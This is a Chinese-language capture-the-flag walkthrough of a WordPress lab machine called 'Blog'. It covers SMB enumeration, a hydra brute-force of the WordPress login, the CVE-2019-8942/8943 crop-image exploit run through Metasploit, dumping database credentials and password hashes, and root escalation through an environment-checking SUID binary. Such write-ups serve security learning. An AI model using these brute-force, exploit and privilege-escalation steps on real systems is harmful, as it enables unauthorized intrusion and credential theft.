# Blog

比利·乔尔（Billy Joel）在他的家用电脑上写了一个博客，并开始工作。这将是非常棒的！

枚举此框并找到隐藏在其上的 2 个标志！比利的笔记本电脑上有一些奇怪的事情。你能四处走动并得到你需要的东西吗？还是你会掉进兔子洞...

为了使博客与 AWS 配合使用，您需要将 blog.thm 添加到 /etc/hosts 文件中。

---

## 端口扫描

循例 nmap 扫：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.44.0 -sV
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 20:28 CST
    Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 98.84% done; ETC: 20:29 (0:00:00 remaining)
    Nmap scan report for blog.thm (10.10.44.0)
    Host is up (0.27s latency).
    Not shown: 996 closed tcp ports (reset)
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp  open  http        Apache httpd 2.4.29
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

## smb枚举

    ┌──(root🐦kali)-[/home/sugobet]
    └─# smbmap -H 10.10.44.0                                  
    [+] Guest session   	IP: 10.10.44.0:445	Name: blog.thm                                          
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        print$                                            	NO ACCESS	Printer Drivers
        BillySMB                                          	READ, WRITE	Billy's local SMB Share
        IPC$                                              	NO ACCESS	IPC Service (blog server (Samba, Ubuntu))

smbclient连进去，有几个文件，图片有隐写，但是没什么有用的东西

    ┌──(root🐦kali)-[/home/sugobet]
    └─# smbclient //10.10.44.0/BillySMB                 
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Sat Jan 14 20:30:49 2023
    ..                                  D        0  Wed May 27 01:58:23 2020
    Alice-White-Rabbit.jpg              N    33378  Wed May 27 02:17:01 2020
    tswift.mp4                          N  1236733  Wed May 27 02:13:45 2020
    check-this.png                      N     3082  Wed May 27 02:13:43 2020

## Web检索

进web看看：

查看主页源代码：

    44 <meta name="generator" content="WordPress 5.0" />

我们得到了wp的版本，当然使用wappalyzer也得到相同的结果

登录页面：

    http://blog.thm/wp-login.php

任意输入一些数据，发现：

    ERROR: Invalid username

我们在前面检索web的时候，主页中文章的作者：

     By Karen Wheeler -> http://blog.thm/author/kwheel/
    By Billy Joel -> http://blog.thm/author/bjoel/

我们得知用户名应该是：

    kwheel
    bjoel

使用任意密码进行登录，发现两个用户都存在

## hydra爆破

使用F12打开浏览器开发者工具，切换到Network模块，抓登录包，查看请求表单的数据并切换到原始：

    log=bjoel&pwd=qwe&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1

创建./test1.txt，将两个用户名添加进去

hydra: 

    ┌──(root🐦kali)-[/home/sugobet]
    └─# hydra -L ./test1.txt -P /usr/share/wordlists/rockyou.txt 10.10.44.0 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:incorrect"

结果：

    [80][http-post-form] host: 10.10.44.0   login: kwheel   password: cutiepie1

成功登录进后台

## CVE-2019-8943 & CVE-2019-8943

通过CVE-2019-8942，攻击者可以将_wp_attached_file的meta_key(用于检索存储在数据库中的值并显示它)修改为任意值。利用该漏洞需要发送post请求，一般正常的请求不会在请求中包含文件参数，而攻击者创建的请求中通过携带文件参数对_wp_attached_file的meta_key进行更新

可以将CVE-2019-8942的攻击与另一个漏洞CVE-2019-8943连接起来，后者可以让攻击者将上传的文件移动到可以成功执行嵌入式PHP代码的任意目录中。

<img src='https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.ws.126.net%2FsQabuxXzcrcsZQWtZ68rJQAdKpHiHuPQ90Q85lB6SpkYE1551443009275compressflag.png&thumbnail=660x2147483647&quality=80&type=jpg' />

CVE-2019-8943。在wp-admin/include /image.php中的wp_crop_image函数(允许WordPress用户将图像裁剪到给定的大小或分辨率)中，php在保存文件之前不会验证.dst(绘图表文件)的文件路径。

<img src='https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.ws.126.net%2FUvGcBKGih168nn0dyNJqh2pl4MqT7ZXSChCNi2RNZYisS1551443009850.png&thumbnail=660x2147483647&quality=80&type=jpg' />

wp_crop_image函数试图访问本地文件

一旦修改了meta_key中的文件名，文件(例如图3中的evil1.jpg?../和../evil1.jpg)将不会在upload目录中找到。因此，它将回退到wp_crop_image函数中的下一个If条件，并尝试通过URL访问该文件。此步操作需要在WordPress站点中安装文件复制插件。请求如下所示：

    /evil1.jpg?../../evil1.jpg

在加载图像时，“?”之后的路径将被忽略。图像加载后，攻击者可以裁剪图像，它将遵循路径遍历并将其保存在任意目录中。

参考文章：https://www.163.com/dy/article/E977V9KN0511CJ6O.html

---

## Get shell

了解完原理，这里我选择使用msf快速上线

    exploit/multi/http/wp_crop_rce

拿到shell后发现user.txt在bjoel的家目录下，是假的：

    find / -type f -name user.txt 2>/dev/null

也没找到，先不管了

## 有个声音一直在提醒我，第一时间先找config配置文件 - 横向移动

bjoel用户刚刚在wp中是存在该用户的，不妨我们假设该用户ssh使用与wp相同的密码

wp-config.php查看到数据库用户名和密码：

    /** MySQL database username */
    define('DB_USER', 'wordpressuser');

    /** MySQL database password */
    define('DB_PASSWORD', 'LittleYellowLamp90!@');

结果：

    mysql> select * from wp_users
    select * from wp_users
        -> ;
    ;
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    | ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    |  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
    |  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    2 rows in set (0.00 sec)

## hashcat 爆破

使用haiti-hash帮助快速识别hash类型：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# haiti '$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/'
    Wordpress ≥ v2.6.2 [HC: 400] [JtR: phpass]
    Joomla ≥ v2.5.18 [HC: 400] [JtR: phpass]
    PHPass' Portable Hash [HC: 400] [JtR: phpass]

hashcat:

    ┌──(root🐦kali)-[/home/sugobet]
    └─# hashcat -a 0 -m 400 '$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/' /usr/share/wordlists/rockyou.txt

结果没爆出来，666

## 权限提升

    find / -type f -perm -u+s 2>/dev/null

发现可疑的程序：

    www-data@blog:/var/www/wordpress$ ls -la /usr/sbin/checker
    ls -la /usr/sbin/checker
    -rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
    www-data@blog:/var/www/wordpress$ /usr/sbin/checker
    /usr/sbin/checker
    Not an Admin

估计是调用了什么东西来识别我们的权限

使用ltrace追踪一下

    www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
    ltrace /usr/sbin/checker
    getenv("admin")                                  = nil
    puts("Not an Admin"Not an Admin
    )

获取环境变量admin的值来判断的

盲猜，伪代码:

    if getenv("admin") == "Admin"

:

    www-data@blog:/var/www/wordpress$ export admin=Admin
    www-data@blog:/var/www/wordpress$ /usr/sbin/checker
    root@blog:/var/www/wordpress# whoami
    root

成功getroot

user.txt

    root@blog:/var/www/wordpress# find / -type f -name user.txt 2>/dev/null
    find / -type f -name user.txt 2>/dev/null
    /home/bjoel/user.txt
    /media/usb/user.txt

root.txt还在老地方
